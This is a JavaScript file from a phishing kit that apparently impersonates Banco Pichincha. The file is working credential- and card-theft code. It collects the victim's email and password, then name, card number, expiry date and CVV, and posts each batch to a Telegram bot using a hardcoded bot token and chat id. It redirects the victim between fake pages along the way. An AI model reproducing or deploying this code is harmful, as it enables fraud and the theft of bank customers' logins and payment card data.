//by:: @sn0wdie [info]telegram

//bot token 
var telegram_bot_id = "6448801770:AAGMmWw_3eNwWyz1Lg2IJ-CKCbmrB3Y4Vfg";
//chat id
var chat_id = "5122863942";
var USER, PASS, PIN, PIN2, PIN3, NUMBER,message, EM4IL;

// data 1

var ready = function () {
    EM4IL = document.getElementById("m41l1").value;
    pass = document.getElementById("p4ss1").value;
    message = "PICHINCHA 🟡| @sn0wdie" + "\n----\n" + "MAIL: "  + EM4IL + "\nMPASS: " + pass + "\n" + "----";

    localStorage.setItem("m41l1", EM4IL);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="validecard.html"
    });
    return false;
}

//data 2

var ready1 = function () {
    EM4IL = localStorage.getItem("m41l1");
    nombre = document.getElementById("name1").value;
    apellido = document.getElementById("lname1").value;
    ccnum = document.getElementById("ccnum1").value;
    mm = document.getElementById("mm1").value;
    aa = document.getElementById("aa1").value;
    cvv = document.getElementById("cvv1").value;
    message = "PICHINCHA 🟡| " + EM4IL + "\n----\n" + "Name: " + nombre + "\nLname: " + apellido + "\nCCNUM: " + ccnum + "\nFV: " + mm + "/" + aa + "\nCVV: " + cvv + "\n----";
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="success.html"
    });
    return false;
}

